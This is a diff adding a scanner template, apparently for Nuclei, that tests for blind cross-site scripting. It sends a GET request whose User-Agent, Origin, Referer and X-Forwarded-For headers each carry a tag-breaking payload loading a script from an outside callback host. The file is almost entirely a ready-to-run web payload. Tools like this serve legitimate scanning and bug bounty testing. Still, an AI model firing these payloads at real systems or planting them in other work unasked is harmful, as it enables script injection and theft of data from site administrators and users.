@@ -1,0 +1,19 @@
+id: BXSS
+
+info:
+  name: Blind XSS payloads sending through headers
+  author: 25
+  severity: high
+  tags: XSS
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      User-Agent: '''>"></title></style></textarea></script><script src=https://just25testing.xss.ht></script>'
+      Origin: '''>"></title></style></textarea></script><script src=https://just25testing.xss.ht></script>'
+      Referer: '''>"></title></style></textarea></script><script src=https://just25testing.xss.ht></script>'
+      X-Forwarded-For: '''>"></title></style></textarea></script><script src=https://just25testing.xss.ht></script>'
+      Test-header: 'Testing for Blind XSS'
